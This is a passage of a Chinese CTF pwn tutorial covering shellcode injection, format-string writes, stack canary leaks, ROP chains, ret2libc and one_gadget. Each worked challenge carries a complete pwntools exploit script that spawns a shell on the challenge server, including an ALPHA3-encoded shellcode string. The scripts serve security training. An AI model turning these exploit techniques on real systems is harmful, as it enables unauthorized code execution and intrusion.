    payload = b"A"*offset + p64(name_adr)
    io.sendline(payload)
    io.interactive()

if  __name__ == "__main__":
    main()
```

#### 例题 3：mrctf2020_shellcode

[BUU CTF 题目链接](https://buuoj.cn/challenges#mrctf2020_shellcode)

安全检查：

<img width="392" height="148" alt="52532d2aafc7eb5c50944082a73d0c53" src="https://github.com/user-attachments/assets/dc3413b1-7347-4182-926b-93ddd25f2352" />

<img width="691" height="455" alt="8fd3760501dba3550fb0e8e646f9a1b9" src="https://github.com/user-attachments/assets/cf9e0d1e-9b9f-48c2-b4ef-897c549441a8" />

这道题反编译看不了伪代码，看汇编吧。

<img width="928" height="490" alt="image" src="https://github.com/user-attachments/assets/223f67f9-7ee2-41d5-8d1d-5321a75de850" />

发现这道题直接 jump 到输入的地址上，所以根本不用算溢出（其实也溢出不能，因为 read 规定的读入量爆不了栈），直接把 shellcode 发过去就行。

```
# Written by Sonnety
from pwn import *

context.arch = "amd64"
host = "node5.buuoj.cn"
port = 25867
shellcode = asm(shellcraft.sh())


def main():
    io = remote(host,port)
    io.recvuntil(b"Show me your magic!\n")
    io.sendline(shellcode)
    io.interactive()

if __name__ == "__main__":
    main()

```

[几乎一模一样的题：picoctf_2018_shellcode](https://buuoj.cn/challenges#picoctf_2018_shellcode)

```
# written by Sonnety
from pwn import *
context.arch = "i386"

host = "node5.buuoj.cn"
port = 29289
shellcode = asm(shellcraft.sh())

def main():
    io = remote(host,port)
    io.recvuntil(b"Enter a string!\n")
    io.sendline(shellcode)
    io.recvline()
    io.recvuntil(b"Thanks! Executing now...\n")
    io.interactive()

if __name__ == "__main__":
    main()
```

#### 例题 4：mrctf2020_shellcode_revenge

[BUU CTF 题目链接](https://buuoj.cn/challenges#mrctf2020_shellcode_revenge)

安全检查：

<img width="445" height="150" alt="image" src="https://github.com/user-attachments/assets/0f5573e2-2b46-4eef-a00e-e73fc9407373" />

反编译依然不能看伪代码，但是看汇编中有明显的 payload 检查，要求 payload 是可见字符。

<img width="1280" height="534" alt="image" src="https://github.com/user-attachments/assets/a5829d54-cb3d-4994-8ef8-a551a8705fc3" />

最后跳到 payload 上，那么我们的 payload 就要求必须是题目指定白名单内的可见 shellcode。

生成指定白名单的可见 shellcode，可以用使用 `ALPHA3` 生成要求的 shellcode。

[ALPHA3](https://github.com/SkyLined/alpha3/tree/master)

先把 shellcode 打印出来放一个文件里，这里的 shellcode 是机器码。

```
# written by Sonnety
from pwn import *
context(arch = "amd64",os = "linux")

f = open("shellcode_x64","wb")
shellcode = asm(shellcraft.sh())

def main():
    f.write(shellcode)
    f.close()

if __name__ == "__main__":
    main()

```

现在我们已经打印到 `shellcode_x64` 文件上了，然后使用 ALPHA3 转成可见 ascii。

以下面的常见命令为例：

`python2 ALPHA3.py <arch> <charset_family> <charset_variant> <reg> --input=<raw_shellcode_file> > out.txt`


* `<arch>`：x86 或者 x64。
* `<charset_family>`：常见是 ascii（可见字符）。
* `<charset_variant>`：mixedcase（大小写混合），uppercase（全大写）
* `<reg>`：告诉 decoder 哪个寄存器指向你的 payload 起始地址
  * 如果题目是 `call rax` / `jmp rax`，通常选 rax
  * 如果题目是 `jmp rsp`，通常选 rsp
* `--input=<file>`：原始 shellcode 的二进制文件（raw bytes）
* 输出 `out.txt`

对于这道题，IDA 的最后有 call rax。

<img width="374" height="140" alt="image" src="https://github.com/user-attachments/assets/d39ea82b-504f-44b1-b489-0241e397ce30" />

所以执行 `python2 ALPHA3.py x64 ascii mixedcase rax --input='shellcode_x64' > x64_out`，然后把 `x64_out` 的东西直接抄到 shellcode 即可。

```
# written by Sonnety
from pwn import *
context(arch = "amd64",os = "linux",log_level = "debug")

host = "node5.buuoj.cn"
port = 26289
shellcode = "Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"


def main():
    io = remote(host,port)
    io.recvuntil(b"Show me your magic!\n")
    io.send(shellcode)  # sendline() 的 \n 可能会破坏字符检查，应该使用 send()
    # io.recvuntil(b"I Can't Read This!")
    io.interactive()

if __name__ == "__main__":
    main()
```

然后有一个很类似的题目：

[nss ctf 题目链接 safe_shellcode](https://www.nssctf.cn/problem/2933)

这个题目它直接把伪代码以 .C 发下来了，有 `if(buf[i]<'0'||buf[i]>'z')` 的 判断，从 '0' 到 'z'，而且还是 call rax，所以 payload 都和上面的一模一样。

```
# written by Sonnety
from pwn import *
context.arch="amd64"

host = "node5.anna.nssctf.cn"
port = 23022
shellcode = "Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"

def main():
    io=remote(host,port)
    io.send(shellcode)
    io.interactive()

if __name__ == "__main__":
    main()
```


## 格式化字符串漏斗 && Canary 绕过

### fmt 攻击

即出现了类似 `printf(buf)` 的可控漏洞。

正常的输出函数，大概形似 `printf(format, a1, a2, a3, ...)` 这样。

* 32位：

所有的参数全都在栈上。

调用前，程序会按 `x3, x2, x1, "format_string_addr"` 的顺序，把它们从右到左全 push 进栈里。

printf 只要顺着栈顶 esp 一路往下摸，就能完美地依次摸到 x1, x2, x3。

* 64 位：

前 6 个参数在寄存器里。

`rdi = "format_string_addr"` (本体)

`rsi = x1` (第 1 个槽位)

`rdx = x2` (第 2 个槽位)

`rcx = x3` (第 3 个槽位)

printf 会先去掏这几个寄存器，寄存器掏空了，再顺着栈往下摸。

如果我们把 `x1,x2,x3...` 成为参数列表，那么在正常执行时：

* 读取 format 字符串
* 遇到 `%x/%p/%s/%n` 就去“参数列表”里取一个参数来用
  * `%x`：取一个整数打印
  * `%p`：取一个指针打印
  * `%n`：取一个“指针”，向这个指针指向的地址写入输出长度

并且，在正常的 `printf("format",x1,x2,x3)` 中，我们不能控制 format。

但是，对于 `printf(buf)`，**我们写入的所有形式的 format 都会执行**，所以我们可以输入一串 %p 泄露大量数据，也可以通过 `payload = b"%<len>c%<x>$n"` 向第 x 个参数槽位指向的地址赋值为 len。

什么意思呢，比如我们写入 `"AAAAAAAA" + p32(addr) + 很多很多%p`，%p后面没有传参数，他就会按规矩，从第一个额外参数槽位（rsi 寄存器 或 栈顶紧挨的位置）开始逐个取出输出。

那些槽位里可能装着上一个函数留下来的极其机密的栈地址、可能装着 libc 里的返回地址、甚至可能装着刚刚写在栈上的伪造地址。

我们写入的 `"AAAAAAAA" + p32(addr)` 往往不是第一个参数槽位，因此存在一个偏移，从第一个输出一个个数到出现 `0x4141414141...` 的距离就是 offset。

当我们获取这个 offset，就可以构造 `payload = b"%<len>c" + p32(addr) + b"%<offset>$n"`，控制向 addr 写入 len + 4.

另外，**由于 printf 认为 `\x00` 截断，但是 64 位系统下内存地址往往包含 `\x00`**，如`\x18\x10\x60\x00\x00\x00\x00\x00`，会造成 printf 半路返回，所以 64 位的 payload 要把 p64(addr) 放到最后。

此时我们的 `payload = b"%<len>c%<offset+?>$n" + b'A'*padding + p64(addr)`，`padding` 的目的是让 `b"%<len>c%<offset+?>$n" + b'A'*padding` 这一串的字符串长度是 8 的倍数，使 addr 落在整 8 字节的槽位上。

`offset+?` 需要动态调试得到，一般多两三位，

结果将向 addr 写入 len。

最后，**如果我们想要向 got 表写入信息（0x7fxxxxxx）**，过大的输出量会直接卡死靶机，所以可以使用：

* `%hn`：一次只往内存里写 2 个字节（最多打印 65535 个字符，瞬间跑完）。
* `%hhn`：一次只往内存里写 1 个字节（最多打印 255 个字符，速度极快）。

### Canary 绕过

在 “常见安全保护中”，我们曾提到：

> `Canary found`：有栈保护，溢出覆盖返回地址前会先覆盖 canary，函数返回时会检查。

Canary 栈保护的核心思想，就是在函数的栈上放一段“哨兵值”（canary），函数返回前检查它有没有被覆盖；被覆盖就说明发生了溢出，直接终止程序。

在 **无 Canary 保护** 的栈上，大概形似：

```
高地址
+------------------------+
| 返回地址 RET           |  <-- 函数 ret 会跳到这里
+------------------------+
| 保存的 RBP（旧栈底）    |
+------------------------+
| 其他局部变量(可选)      |
+------------------------+
| buf[64]                |  <-- 溢出从这里开始往上“顶”
+------------------------+
低地址

```

在 **有 Canary 保护** 的栈上，大概形似：

```
高地址
+------------------------+
| 返回地址 RET           |
+------------------------+
| 保存的 RBP（旧栈底）    |
+------------------------+
| Canary（栈保护值）      |  <-- 夹在中间
+------------------------+
| 其他局部变量(可选)      |
+------------------------+
| buf[64]                |
+------------------------+
低地址
```

而函数返回时会做以下检查：

* 取出栈上的 canary
* 和“原始 canary”比较 （存储在 *线程本地存储 TLS（Thread-Local Storage）* 上）
* 不相等就 `__stack_chk_fail()` 直接崩溃

那么思路就很明显了：写到 RET 前必然先写到 Canary，除非你能把 Canary 写成原样，也就是 **泄露 Canary**。

但是为了防止 Canary 被 `puts` 或 `printf("%s")` 等字符串打印函数意外泄露，Canary 的最低位字节永远是 \x00（例如：`0x7bf3a94832451200`）。因为 \x00 是字符串的结束符，打印函数读到这里就会停下。

而泄露 Canary 的常见方式有两种。

### 覆盖 canary 低字节泄露

常见叫法有很多种：

* Canary byte overwrite leak（覆盖 canary 低字节泄露）
* Null-byte overwrite leak / off-by-one leak（空字节覆盖/Off-by-one 泄露）
* String over-read leak（字符串越界读取泄露）
* puts 泄露 canary、通过 %s 泄露 canary

总而言之是一个东西。

Canary 设计为以字节 `\x00` 结尾，本意是为了保证 Canary 可以截断字符串，即程序遇到 `printf("%s", buf)`、`puts(buf)` 这种按字符串输出的函数时，输出会在遇到 `\x00` 就停下，不容易“顺带把后面的栈内容打印出来”。

泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。

这种利用方式需要存在合适的输出函数，并且可能需要 **第一溢出** 泄露 Canary，之后 **再次溢出** 控制执行流程。

假设栈上布局为：`buf | canary(8字节) | saved rbp | ret`。

canary 形似：`00 aa bb cc dd ee ff 11`。

如果有 `puts(buf)`，正常情况下输出读到 canary 的第一个字节就是 00，就停了，

但如果把 00 改掉，比如改成 'A'（41），那么 canary 形似：`41 aa bb cc dd ee ff 11`，输出函数就会继续把 canary 后面的字节 `aa bb cc ...` 也当成“字符串内容”输出出来。

（直到某个地方再次遇到 \x00 才停止）

同时 canary 坏了，所以这次程序崩溃，再拿正确的 Canary 溢出第二次，这就是二次溢出。

### fmt 攻击

我们可以直接输入 `%p-%p-%p...` 来查看栈上的数据。

通过调试找到 Canary 在栈上的偏移量（Offset）。

假设偏移量是 15，直接输入 %15$p 就能让程序把 Canary 的十六进制值打印出来。

#### 例题 1：jarvisoj_fm

[BUU CTF 题目链接](https://buuoj.cn/challenges#jarvisoj_fm)

安全检查：

<img width="347" height="126" alt="02dbe0c8ceb99d6f115a0ce83d59b0d3" src="https://github.com/user-attachments/assets/f599dd19-634a-4ba2-9533-bf90b1232359" />

IDA 主函数伪代码：

<img width="1280" height="448" alt="09af40d62dcbb31092abd2027a56db9f" src="https://github.com/user-attachments/assets/a74bedf6-4a6b-4cf6-9aac-929a8da2f6be" />

发现 `printf(buf);` 存在格式化字符串漏洞，需要修改 `x=4`。

<img width="1022" height="419" alt="image" src="https://github.com/user-attachments/assets/cb6bb3b3-6569-4d28-9863-59e39d8f1bcf" />

IDA 查到 x 地址为 `x	0804A02C`。

<img width="602" height="75" alt="image" src="https://github.com/user-attachments/assets/e93c3d60-45e1-47e8-9f89-b07c9231fc89" />

offset = 11

```
# written by Sonnety
from pwn import *
context.arch = "i386"

host = "node5.buuoj.cn"
port = 28944
x_addr = 0x804A02C

def main():
    io = remote(host,port)
    payload = p32(x_addr) + b"%11$n"    # offset = 11
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    main()
```

（tips：如果判断 x==5，就将 payload 改为 p32(x_addr) + b"A%11$n"）

#### 例题 2：[第五空间2019 决赛]PWN5

[BUU CTF 题目链接](https://buuoj.cn/challenges#[%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%20%E5%86%B3%E8%B5%9B]PWN5)

和上道题很像，只是伪代码更复杂了一点点。

安全检查：

<img width="311" height="117" alt="853cd3a6a9f1085a1184b16ec2071df3" src="https://github.com/user-attachments/assets/d0d30675-bb4a-4af6-9909-a060c1bf5fe1" />

伪代码：

<img width="1280" height="526" alt="123e878ad745095d5b77f6ecf252d1d2" src="https://github.com/user-attachments/assets/14f4c410-d6f4-443f-93ba-9b587e0e31fa" />

要点其实是随机生成一个密码存到 `buf_` 里面，然后再等你输入密码存到 `nptr` 里面，两个相等就 shell。

然后里面有一个 `printf(buf);` 显然是格式化字符串攻击，修改 buf_值。

<img width="1280" height="527" alt="image" src="https://github.com/user-attachments/assets/4cd4bd3e-d81e-435e-9bbf-d4ad40fd3134" />

得到 `buf_` 地址 `0x804C044`。

<img width="406" height="68" alt="f80dc88844da732b02f4c731b4158d1e" src="https://github.com/user-attachments/assets/31e08b04-277a-4c74-b295-bab2086f1d38" />

得到 offset = 10.

```
# written by Sonnety
from pwn import *
context.arch = "i386"

host = "node5.buuoj.cn"
port = 29968
buf_addr = 0x804C044

def main():
    io = remote(host,port)
    io.recvuntil("your name:")
    payload = p32(buf_addr)+b"%10$n"    # offset = 10
    io.sendline(payload)
    io.recvline()
    io.recvuntil("your passwd:")
    io.sendline(b"4")
    io.interactive()

if __name__ == "__main__":
    main()
```

#### 例题 3：web_of_sci_volga_2016

[BUU CTF 题目链接](https://buuoj.cn/challenges#web_of_sci_volga_2016)

查看保护：

<img width="404" height="140" alt="319b8030d817d8012a1fc29ffacac555" src="https://github.com/user-attachments/assets/4b4805f7-efa6-4e50-800a-5add29acc7dd" />

主要函数反编译：

<img width="1280" height="512" alt="e186151663aa0fc7eed3dfd2dbe339f6" src="https://github.com/user-attachments/assets/436106cd-0ef2-4e6c-ab65-a33654572715" />

发现，`printf(format);` 格式化字符串漏洞，可以泄露 Canary 和 栈地址，`gets(nptr)` 可以栈溢出。

```
char nptr[136]; // [rsp+A0h] [rbp-A0h] BYREF
unsigned __int64 v8; // [rsp+128h] [rbp-18h]
v8 = __readfsqword(0x28u);
```

基本可以确定 v8 是 Canary 的栈副本，0xA0 - 0X18 = 0x88 = 136，这就是覆盖到 canary 需要的 offset。

然后查 Canary_k 和 stack_k：

<img width="409" height="310" alt="image" src="https://github.com/user-attachments/assets/87488515-ac85-4825-8bdd-572e5cb20c1d" />

可见 `Canary_k = 43`。

<img width="404" height="98" alt="8de4a9b68281e79cd5acecd4a54b7683" src="https://github.com/user-attachments/assets/a4658e16-54f5-45b4-8bfb-9b5caedc72d8" />

可见 `stack_k = 46`（通过开头是栈地址 `0x7ffd…` 以及 16 字节对齐，结尾通常是 `...0`, `...10`, `...f0`, `...e0` 判断）

然后 pwndbg 调试一下，找到 shellcode 在 `stack_addr - 192` 位。

```
# written by Sonnety
from pwn import *
context.arch = "amd64"

host = "node5.buuoj.cn"
port = "27101"
offset = 136

def main():
    io = remote(host,port)
    io.recvuntil(b"Tell me your name first\n")
    io.sendline(b"%43$p.%46$p")  # canary_k = 43,stack_k = 46
    io.recvuntil(b"Alright, pass a little test first, would you.\n")
    io.recvline()
    io.recvuntil("0x")
    canary = int(io.recv(16),16)
    io.recvuntil("0x")
    stack_addr = int(io.recv(12),16)
    for i in range(9):
        io.sendline("Sonnety kawaii daisuki")
        io.recv()
    shellcode = asm(shellcraft.sh())
    payload = shellcode + (offset - len(shellcode)) * b"A" + p64(canary) + 3 * p64(0x0) + p64(stack_addr - 192)
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    main()
```

## ROP 链基础

在开启了 NX 保护，栈上的数据变得“不可执行”时，ROP 链是解题的主要思路。

ROP（Return Oriented Programming）的本质是：

通过溢出控制**返回地址 EIP**，把下一步要返回到哪里、参数是什么都提前摆在栈上，从而把多个调用串起来。

既然我们不能自己写代码执行，那就利用程序段（.text）或库函数（libc）中原本就存在的代码片段。

这些片段通常以 `ret` 指令结尾，被称为 Gadgets。

* Gadgets: 比如 `pop rdi; ret`。这条指令的作用是将栈顶数据弹出到 `rdi` 寄存器，然后返回。
* Chain: 通过精心构造栈布局，让 `ret` 指令不断连接不同的 Gadgets，像链条一样执行一连串操作。


### 例题 1：[HarekazeCTF2019]baby_rop

[BUU CTF 题目链接](https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop)

<img width="335" height="121" alt="ef278c62e6196864e436221f2bb4cc4b" src="https://github.com/user-attachments/assets/cb63746c-f09f-4059-b144-a8c79d8fee3e" />

栈不可执行。

<img width="341" height="45" alt="d1b5c630feabbb7668edfdc7fc77a055" src="https://github.com/user-attachments/assets/b124bc63-c2c2-42a2-9db4-f48b8378a3a1" />

`rdi_pop_ret = 0x400683`

打开 IDA 发现 没有后门函数，但是有 binsh：

<img width="506" height="183" alt="image" src="https://github.com/user-attachments/assets/182b09ff-7b65-48c3-bcc2-ad9b5c6ec68c" />

主函数还有一个 system：

<img width="1006" height="318" alt="image" src="https://github.com/user-attachments/assets/70481f40-4158-4e6d-816f-6b5e6b01f831" />

<img width="730" height="392" alt="image" src="https://github.com/user-attachments/assets/8a4b4213-3c31-442f-8322-929f042b0bb7" />

那么 这就是一个普通的 rop 链。

```
# written by Sonnety
from pwn import*
context.arch = "amd64"

host = "node5.buuoj.cn"
port = 29812

io=remote(host,port)
offset = 24
system = 0x400490
binsh = 0x601048
pop_rdi_ret = 0x400683
payload = b"A"*offset + p64(pop_rdi_ret) + p64(binsh) + p64(system)

def main():
    io.sendline(payload)
    io.interactive()

if __name__ == "__main__":
    main()
```


## Ret2libc

[libc 查询](https://libc.blukat.me/)

> 前文提到 ASLR，PLT，GOT 可复习。

在 ROP 链的基础上，我们不跳去执行栈上的代码，而是在跳转执行 C 标准库（libc.so）中的函数，最后 `system("\bin\sh")`。

但是在 ASLR 的基础下，libc 在内存中的基地址每次运行都是随机化的，但是 **函数在 libc 库中的偏移是固定的**。

如果我们能够泄露出某个执行过的函数的真实地址（在 GOT 表上），我们就可以反推 base_libc。

紧接着就可以配合固定的偏移量得到 `system` 的真实地址。

正常执行程序时，栈上逻辑形似：

```
内存地址         数据内容              逻辑含义
      | ...       |   | ...         |
RSP ->| 0x7fff... |   | 0x400c83    |  <-- ret 
      | 0x7fff... |   | 0x400795    |  <-- main_addr (返回地址)
      | ...       |   | ...         |
```

也就是说我们需要构造第一个 payload，以 64 位为例，形似：

```
payload1 = flat([
    b'A' * offset,
    pop_rdi_ret,
    puts_got,      # rdi = puts_got
    puts_plt,      # call puts
    main_addr      # return to main
])
```

此时 payload 在栈上表示如下（上低下高）：

```
内存地址         数据内容              逻辑含义
      | ...       |   | ...         |
RSP ->| 0x7fff... |   | 0x400c83    |  <-- pop_rdi_ret (Gadget地址)
      | 0x7fff... |   | 0x601018    |  <-- puts_got (作为参数的数据)
      | 0x7fff... |   | 0x4006e0    |  <-- puts_plt (函数地址)
      | 0x7fff... |   | 0x400795    |  <-- main_addr (返回地址)
      | ...       |   | ...         |
```

在执行时，程序发生了以下变化：

1. 触发 ROP

执行 `ret`，弹出栈顶数据给 `RIP`，即 pop_rdi_ret。

程序跳转到了我们的 gadget 开始执行。

2. 执行 Gadget

`pop rdi` 弹出当前栈顶的数据，放入 `RDI` 寄存器，即 puts_got。

`ret` 弹出栈顶数据给 `RIP`，即 puts_plt。

程序执行 `puts`，输出 `RDI` 寄存器中的数据，打印出 `puts` 的真实地址。

3.puts 函数返回

`ret` 弹出栈顶数据给 `RIP`，即 main_addr。

重新从 main 开始运行。我们获得了第二次输入的机会。

### 例题 1：ciscn_2019_c_1

[BUU CTF 题目链接](https://buuoj.cn/challenges#ciscn_2019_c_1)

<img width="1278" height="564" alt="b21603601caff8e0a9ee4dd549f048e4" src="https://github.com/user-attachments/assets/a567a28c-83f9-431e-8fea-84b68e9d294f" />

简单说就是只有操作 1 能用，看看函数。

<img width="1277" height="547" alt="83e73e73f2cd24ac8e04693c69a7acd2" src="https://github.com/user-attachments/assets/d8123936-3015-4828-bffc-131a2948451f" />

可以看到有一个异或操作会让我们的payload乱掉，但是 `strlen()` 遇到 `/0` 就停，所以可以绕过。

<img width="384" height="57" alt="883a364344a08da7b1120df03634fd9f" src="https://github.com/user-attachments/assets/44757be5-3929-4bc2-8d03-8b13a286bcfc" />

<img width="525" height="252" alt="88f295a69f4ee40ffdb47c15bef8d760" src="https://github.com/user-attachments/assets/93cd5e46-4900-426c-aac9-063361191418" />

<img width="481" height="163" alt="image" src="https://github.com/user-attachments/assets/9df3c2cb-691e-49b3-95d5-48829b332fcd" />

```
# written by Sonnety
from pwn import *
context.arch = "amd64"

host = "node5.buuoj.cn"
port = 26159
io = remote(host,port)
elf = ELF("./ciscn_2019_c_1")
offset = 0x57
padding = b'\0' + b"A"*offset
pop_rdi_ret = 0x400c83
ret = 0x400c84
encrypt = 0x4009A0
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']
payload_1 = padding + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(encrypt)

def main():
    io.recvuntil(b"Input your choice!\n")
    io.sendline(b"1")
    io.recvuntil(b"Input your Plaintext to be encrypted\n")
    io.sendline(payload_1)
    puts_addr = u64(io.recvuntil('\x7f')[-6:].ljust(8, b'\x00'))    
    print(hex(puts_addr))   # 0x7f32720c99c0 → libc6_2.27-3ubuntu1_amd64
    system_addr = puts_addr - 0x31580
    binsh_addr = puts_addr + 0x1334da
    payload_2 = b'\0' + b'A'*offset + p64(pop_rdi_ret) + p64(binsh_addr) + p64(ret) + p64(system_addr)
	# + ret 栈对齐
    io.recvuntil(b"Input your Plaintext to be encrypted\n")
    io.sendline(payload_2)
    io.interactive()
    
if __name__ == "__main__":
    main()
```

### 例题 2：jarvisoj_level3_x64

[BUU CTF 题目链接](https://buuoj.cn/challenges#jarvisoj_level3_x64)

<img width="414" height="129" alt="59e36a73030fbbd65b7f8d31e1949568" src="https://github.com/user-attachments/assets/42402a21-f6b9-4e4b-81c9-8f339a1ce38c" />

依旧栈不可执行。

打开 IDA pro 发现一些有趣的东西。

<img width="1280" height="439" alt="82d1191ba73066ae7d892b23bfd5e346" src="https://github.com/user-attachments/assets/4c95ac85-8bc4-489c-b9f1-4221be2b6d8a" />

<img width="1280" height="291" alt="image" src="https://github.com/user-attachments/assets/1f2a8e71-64f7-4005-ac53-b5772732e974" />

那么我们的大体思路就是利用 `read()` 劫持 `write()` 并打印 write_addr，从而确定 libc 基址。

具体实现如下：

```
# written by Sonnety
from pwn import *
context(os = "linux", arch = "amd64", log_level = "debug")
host = "node5.buuoj.cn"
port = 26772

io = remote(host,port)
# io = process("./level3_x64")
elf = ELF('./level3_x64')
offset = 0x88
main_addr = 0x40061A
pop_rdi = 0x4006b3
pop_rsi_r15 = 0x4006b1
write_plt = elf.plt['write']
write_got = elf.got['write']    # write(fd←rdi,buf←rsi,count←rdx)
payload_1 = b'A'*offset + p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(write_got) + p64(114514) + p64(write_plt) + p64(main_addr)
# 存在 read(0, buf, 0x200u); 使 rdx 足够大，不再更改rdx
# rdi = 1 , rsi = write_got , r15 = 114514 , rdx = 0x200u
# r15 = 114514 没有任何意义，只是为了吃掉 pop r15
def main():
    io.recvuntil(b"Input:\n")
    io.sendline(payload_1)
    leak_data = io.recvn(8)
    write_addr = u64(leak_data)
    print(hex(write_addr))  # 0x7f8a1e8842b0 → libc6_2.23-0ubuntu10_amd64
    libc = write_addr - 0xf72b0
    system = libc + 0x45260
    binsh = libc + 0x18cd57
    payload_2 = b'A'*offset + p64(pop_rdi) + p64(binsh) +p64(system)
    io.sendline(payload_2)
    io.interactive()

if __name__ == "__main__":
    main()
```

### 例题 3：jarvisoj_level3

[BUU CTF 题目链接](https://buuoj.cn/challenges#jarvisoj_level3)

和上一道题唯一区别是 32 位。

注意 32 位没有寄存器，变量直接放栈上，其实比 64 位简单一点。

```
# written by Sonnety
from pwn import *
from LibcSearcher import *

context(os = "linux",arch = "i386",log_level = "debug")
host = "node5.buuoj.cn"
port = 25475

io = remote(host,port)
# io = process("./level3")
elf = ELF("./level3")
offset = 0x8c
main_addr = 0x8048484    # main	08048484	
write_got = elf.got['write']
write_plt = elf.plt['write']
payload_1 = b'A'*offset + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)

def main():
    io.recvuntil(b"Input:\n")
    io.sendline(payload_1)
    leak_data = io.recvn(4)
    write_addr = u32(leak_data)
    print(hex(write_addr))  # 0x656d6974
    # libc = LibcSearcher('write',write_addr)
    libc_base = write_addr - 0xd43c0
    system = libc_base + 0x3a940
    binsh = libc_base + 0x15902b
    payload_2 = b'A'*offset + p32(system) + p32(main_addr) + p32(binsh)
    io.recvuntil(b"Input:\n")
    io.sendline(payload_2)
    io.interactive()

if __name__ == "__main__":
    main()
```

### 例题 4：[OGeek2019]babyrop

[BUU CTF 题目链接](https://buuoj.cn/challenges#[OGeek2019]babyrop)

依旧 32 位，大概意思是会拿输入的数和一个随机数进行比对，如果错了直接退出程序，但是依旧 `strlen()` 比对，所以前加 `\x00` 跳过它。

然后拿输入的第 8 个数，`bufa[7]` 当作函数的返回值，传到第二个函数里当 `read()` 的长度限制，所以我们输入 `\xFF` 超长长度。

然后就开始 ret2libc 爽吃。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'i386',log_level = 'debug')

host = "node5.buuoj.cn"
port = 28281
io = remote(host,port)
# io = process('./pwn')
elf = ELF('./pwn')

offset = 235
write_got = elf.got['write']
write_plt = elf.plt['write']
main_addr = 0x8048825
payload_1 = b'\x00' + b'A'*6 + b'\xFF'  # '\x00' 截断字符比对，'\xFF' 使函数返回值为 255

def main():
    io.sendline(payload_1)
    io.recvuntil(b"Correct\n")
    payload_2 = b'A'*offset + p32(write_plt) + p32(main_addr) + p32(1) + p32(write_got) + p32(4)
    io.sendline(payload_2)
    leak_data = io.recvn(4)
    write_addr = u32(leak_data)
    print(hex(write_addr))  # 0xf7e233c0 → libc6_2.23-0ubuntu11.3_i386
    libc = write_addr - 0xd43c0
    system = libc + 0x3a940
    binsh = libc + 0x15902b
    payload_3 = b'A'*offset + p32(system) + p32(main_addr) + p32(binsh)
    io.sendline(payload_1)
    io.recvuntil(b"Correct\n")
    io.sendline(payload_3)
    io.interactive()


if __name__ == "__main__":
    main()
```

### 例题 5：[HarekazeCTF2019]baby_rop2

[BUU CTF题目链接](https://buuoj.cn/challenges#[HarekazeCTF2019]baby_rop2)

64 位，但是没有 `puts` 没有 `write`，换成了 `printf`。

`printf` 两个参数，一个传入格式化字符串 `%s` 给寄存器 `rdi`（题目第二个 `printf` 自带，利用 pwntools next(elf.search(b"%s")查一下）

第二个输出 `read_got` 即可。

```
# written by Sonnety
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')

host = "node5.buuoj.cn"
port = 26004
io = remote(host,port)
# io = process("./babyrop2")
elf = ELF("./babyrop2")
offset = 0x28
pop_rdi_ret = 0x400733
pop_rsi_r15_ret = 0x400731
ret = 0x400734
main_addr = 0x400636    # main	0000000000400636	
read_got = elf.got['read']
printf_plt = elf.plt['printf']
fmt = next(elf.search(b"%s"))
payload_1 = b'A'*offset + p64(pop_rdi_ret) + p64(fmt) + p64(pop_rsi_r15_ret) + p64(read_got) + p64(114514) + p64(printf_plt) + p64(main_addr)

def main():
    io.recvuntil(b"What's your name?")
    io.sendline(payload_1)
    # leak_data = io.recvn(8)
    # printf_addr = u64(leak_data)
    read_addr = u64(io.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) 
    print(hex(read_addr))       # 0x7fcb56c6f250
    libc = read_addr - 0xf7250
    system = libc + 0x45390
    binsh = libc + 0x18cd57     #.rodata:000000000018CD57	00000008	C	/bin/sh
    payload_2 = b"A"*offset + p64(pop_rdi_ret) + p64(binsh) + p64(system)
    io.recvuntil(b"What's your name?")
    io.sendline(payload_2)
    io.interactive()
    
if __name__ == "__main__":
    main()

```

## one_gadget

其实算一个必须知道的小技巧，不是很大的知识点（大概）

one_gadget 是 glibc 库里一个非常特殊的代码片段，仅调用单个地址就可以直接获得 shell，其实现伪代码可以简单理解为：

```
void magic_gadgets(){
	if (constraints_satisfied){//约束条件检查
		execve("/bin/sh",0,0);
		exit(0);
	}
}
```

使用 one_gadget 工具，可以对 libc 文件扫描算出所有的这些现成的、直接能拿 Shell 的代码片段，**距离 libc 基址的相对偏移量**。（也就是说我们首先要 ret2libc）

在以下三种情况中可以尝试使用 one_gadget:

* 溢出空间极其狭小：如果题目只能覆盖 old rbp 和 返回地址，那么纯 ROP 链就不太合适了，可以尝试使用 one_gadget。

* 缺少关键的 Gadget 寄存器：如果 ROPgadget 工具找不到 `pop rdi;ret` 这种至关重要的寄存器，或者缺少 system 函数时。

* 栈环境被严格限制： 遇到沙箱（Sandbox）或者某些严苛的代码审查，传统 ROP 链会被拦截，而 One Gadget 直接在 libc 内部跳转，隐蔽性极强。

### 使用技巧

one_gadget 通常有 Constraints（约束条件）。

例如：

* `rax == NULL` （跳转过去的瞬间，rax 寄存器必须是 0）

* `[rsp+0x30] == NULL` （跳转过去的瞬间，栈顶往下 0x30 的位置必须是 0）

* `r12 == NULL` 等等...

一般使用时，要么刻意构造（如 在特定位置 [rsp+0x30] 处写入 0），要么前置 gadget 铺垫（如 `xor rax rax;ret` 使 rax 等于 0），要么 **玄学抽卡**（一个个暴力试哈哈）

#### 例题 1：ciscn_2019_c_1

[BUU CTF 题目链接](https://buuoj.cn/challenges#ciscn_2019_c_1)

